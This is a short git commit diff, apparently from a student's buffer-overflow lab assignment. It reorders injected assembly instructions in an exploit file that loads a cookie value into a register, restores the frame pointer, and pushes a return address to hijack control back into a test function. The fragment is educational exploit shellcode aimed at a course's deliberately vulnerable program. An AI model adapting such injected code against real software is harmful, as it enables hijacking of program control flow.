9f5f43aa60b041237dabea04aa0cc501f38750e7
mikaylawalsh <mikayla_walsh@brown.edu>
2022-10-12 14:00:43 -0400

    10/12-28

--- fraudster.s
+++ fraudster.s
@@ -7,7 +7,7 @@
 # find size of buffer: 544 - getbufn 220 in decimal is 544  
 
 exploit:
-    push $0x401385 # put us back in test_exploitn
-    mov $0x622524ed,%rax
     lea 0x20(%rsp),%rbp # offset of 20 rsp into rbp to restore canary 
+    mov $0x622524ed,%rax
+    push $0x401385 # put us back in test_exploitn
     ret
